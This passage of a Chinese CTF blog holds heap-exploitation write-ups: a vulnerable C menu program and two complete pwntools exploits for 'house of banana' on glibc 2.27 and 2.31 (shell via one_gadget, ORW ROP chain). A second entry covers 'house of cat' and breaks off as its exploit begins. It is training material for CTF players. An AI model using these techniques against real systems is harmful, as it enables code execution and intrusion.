&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,chunk_list[index],chunk_size[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> choice;</span><br><span class="line">	init();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">		<span class="keyword">if</span>(choice==<span class="number">5</span>)&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line">			add();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">			show();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line">			edit();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">			delete();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常的菜单堆，肯定是有其他解法，这里只考虑 <code>house of banana</code> ，漏洞就一个 <code>UAF</code> 。</p>
<p>泄露 <code>libc</code> 和堆地址之后，打 <code>large bin attack</code> ，伪造 <code>link_map</code> ，各个字段的赋值上面已经进行了说明，下面是两个 <code>exp</code></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>打 <code>2.27</code> 获取 <code>shell</code> 的 <code>exp</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ec090</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x250</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x61b060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f302</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x61c710</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">8</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=p64(one_gadget)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127310.png" alt="image-20230217205309204"></p>
<p>打 <code>2.31</code> 走 <code>orw</code> 读出 <code>flag</code> 的 <code>exp</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1ebfd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x222060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6aee</span></span><br><span class="line">ret_addr=libc_base+<span class="number">0x0000000000025679</span></span><br><span class="line">setcontext=<span class="number">0x580DD</span>+libc_base</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c1e1</span></span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_addr=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x290</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsp</span></span><br><span class="line">link_map+=p64(read_addr)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">36</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag_addr=heap_base+<span class="number">0xd00</span></span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(write_addr)</span><br><span class="line">p.sendline(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127529.png" alt="image-20230217205622280"></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><code>house of banana</code> 是 <code>ha1vk</code> 师傅提出来的一种利用手法，与<code>house</code> 系列的大部分攻击 <code>IO_FILE</code> 的利用不同，<code>house of banana</code> 是攻击的 <code>rtld_global</code> 结构体，伪造 <code>link_map</code> 进行的劫持执行流，只需要进行一次 <code>large bin attack</code> 并且能调用 <code>exit</code> 函数即可触发攻击，不过在攻击远程的时候可能需要爆破 （ <code>ld</code> 和 <code>libc</code> 的偏移可能在本地和远程不固定）</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[<a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p><a href="https://www.buaq.net/go-85397.html">高Glibc版本下的堆骚操作解析 (buaq.net)</a></p>
<p><a href="https://www.anquanke.com/post/id/222948#h3-5">house of banana-安全客 - 安全资讯平台 (anquanke.com)</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>large bin attack</tag>
        <tag>house of banana</tag>
      </tags>
  </entry>
  <entry>
    <title>house of cat -2022强网杯pwn复现</title>
    <url>/posts/7de5a5b7.html</url>
    <content><![CDATA[<p>前几天进行了 <code>house of apple</code> 的学习，而 <code>house of appl2</code> 和 <code>house of cat</code> 利用的大致思想是一样的（都是通过 <code>wide_data-&gt;wide_vtable</code> 中的函数指针进行的跳转），因此来复现一下去年强网杯的这道 <code>house of cat</code></p>
<p>本题我感觉也比较有代表性，因为在 <code>house of apple</code> 的那篇文章中的例题最后触发攻击是在 <code>exit</code> 函数，但是如果题目中无法从 <code>main</code> 函数返回也没有 <code>exit</code> 函数，那就需要通过 <code>malloc_assert</code> 来触发最后的攻击，而本题就是通过这样的方式触发的攻击。</p>
<span id="more"></span>

<h3 id="如何通过-malloc-assert-触发攻击"><a href="#如何通过-malloc-assert-触发攻击" class="headerlink" title="如何通过 malloc_assert 触发攻击"></a>如何通过 <code>malloc_assert</code> 触发攻击</h3><p><code>__malloc_assert</code> 函数会在内存分配处理之前检查请求是否合法，如果检测到不合法的请求就会触发断言并终止程序，触发这个 <code>__malloc_assert</code> 函数有很多处，<strong>通常我们选择将 <code>top chunk</code> 的 <code>size</code>  改成非法（在 <code>sysmalloc</code> 函数中有针对这里的检查），这样再次申请堆块的时候就会触发 <code>__malloc_assert</code></strong></p>
<p><code>__malloc_assert</code> 在 <code>2.35</code> 的 <code>glibc</code> 中源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有这样一条执行链 <code>__malloc_assert-&gt; __fxprintf-&gt;__vfxprintf-&gt;locked_vfxprintf-&gt;__vfprintf_internal-&gt;_IO_file_xsputn</code></p>
<p>最后触发的 <code>_IO_file_xsputn</code> 是通过 <code>vtable</code> 中的函数指针来触发的，我们想要去劫持的话，首先将 <code>_IO_2_1_stderr</code> 结构体中的 <code>vtable</code> 改成 <code>_IO_wfile_jumps+0x10</code> 的地址（加 <code>0x10</code> 的原因是 <code>_IO_file_xsputn</code> 的地址在 <code>_IO_file_jumps</code> 中比 <code>IO_file_seekoff</code> 的地址低 <code>0x10</code> 个字节），这样原本跳转执行 <code>_IO_file_xsputn</code> 时，实际上执行的是 <code>_IO_wfile_seekoff</code> 如下图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302040938184.png" alt="image-20230204093820778"></p>
<p><code>_IO_wfile_seekoff</code> 函数源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们执行 <code>_IO_wfile_seekoff</code> 函数的目的就是为了触发 <code>_IO_switch_to_wget_mode</code> 函数</p>
<p><code>_IO_switch_to_wget_mode</code> 函数源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行 <code>_IO_switch_to_wget_mode</code> 函数的目的就是为了触发 <code>_IO_WOVERFLOW</code> ,因为这个 <code>_IO_WOVERFLOW</code> 函数是通过 <code>_wide_data-&gt;_wide_vtable</code> 中所存放的函数指针进行跳转的， <code>_wide_vtable</code> 是我们可控的，从而在这里可以劫持程序的执行流。</p>
<p>想触发最后的 <code>_IO_WOVERFLOW</code> ，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> 这个条件。</p>
<p>之所以先提上面的部分是因为本题接下来用的手法只有上面部分是 <code>house of apple2</code>  中没有提到的，其余部分都和 <code>house of apple2</code> 中的利用思路相似，就不再详细说明。</p>
<h3 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h3><p>附件：</p>
<p>链接: <a href="https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4">https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4</a> 提取码: ccp4 </p>
<h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041006987.png" alt="image-20230204100619768" style="zoom: 67%;" />

<p>保护拉满，沙箱是白名单只能打 <code>orw</code> ，需要注意一下 <code>read</code> 的第一个参数只能设置为 <code>0</code> ，所以最后打 <code>orw</code> 之前需要先 <code>close(0)</code></p>
<h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>程序是一个菜单的堆题，不过在使用程序的主要功能之前，需要输入一些数据来绕过这个检查，可能自己的逆向能力还得提高吧，反正这里的检查我是搞了好久，结论就是最开始输入 <code>LOGIN | r00t QWB QWXFadmin</code> 去进行登录，接下来每一次调用具体功能之前都要发送一句 <code>CAT | r00t QWB QWXF$\xff</code> ,接下来才能去执行正常的功能。</p>
<p>功能一共有四个 <code>add</code> <code>edit</code> <code>show</code> <code>delete</code> </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041015973.png" alt="image-20230204101548907" style="zoom:50%;" />

<p><code>edit</code> 函数只能使用两次，并且只能写入 <code>0x30</code> 字节的数据</p>
<p><code>delete</code> 函数存在 <code>UAF</code> 漏洞</p>
<p><code>add</code> 函数申请的堆块大小的范围是 <code>0x418~0x46f</code> ，申请完堆块后可以向里面写入 <code>size</code> 字节的数据</p>
<p><code>show</code> 函数只能泄露 <code>0x30</code> 字节的数据</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>泄露 <code>libc</code> 地址和堆地址</li>
<li>利用 <code>edit</code> 函数完成第一次 <code>large bin attack</code> 向 <code>libc</code> 中的全局变量 <code>stderr</code> 写入一个堆地址，从而控制 <code>_IO_2_1_stderr</code> 结构体的各个字段</li>
<li>第二次 <code>large bin attack</code> 去篡改 <code>top chunk</code> 的 <code>size</code> 将其改为非法（要往小了改，因为只有 <code>top chunk</code> 无法满足要申请的 <code>size </code> 时，才会触发 <code>sysmalloc</code>） <strong>注意 <code>large bin attack</code> 想将 <code>top chunk</code> 的 <code>size</code> 改小的话，需要地址错位</strong></li>
<li>申请一个堆块，此时执行 <code>__malloc_assert</code> 触发攻击</li>
</ol>
<p>思路不难，难点在于整体的一个堆风水和结构体布局需要慢慢调试，因为文章开头已经说明了如何通过 <code>__malloc_assert</code> 触发攻击，剩下的就是先劫持 <code>_IO_2_1_stderr</code> 结构体，将其的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps+0x10</code>  地址，然后 <code>_wide_data-&gt;vtable</code> 改为可控堆地址，使其执行 <code>_IO_WOVERFLOW</code> 的时候，可以进行劫持执行流（这里只说明了<strong>部分篡改</strong>的字段）</p>
<p>然后依然是 <a href="https://zikh26.github.io/posts/19609dd.html">house of apple2</a> 这篇文章的例题中提到的用 <code>magic_gadget</code> 进行一个栈迁移（如果需要看具体的细节请参考 <code>house of apple</code> 这篇文章），然后彻底控制程序的执行流，去打 <code>rop</code> 链，执行 <code>close</code> <code>open</code> <code>read</code> <code>write</code> 函数</p>
<p>最后我出示一下伪造的两个结构体</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041045993.png" alt="image-20230204104522759" style="zoom:50%;" />





<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048906.png" alt="image-20230204104823695" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048822.png" alt="image-20230204104835594" style="zoom:50%;" />



<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span 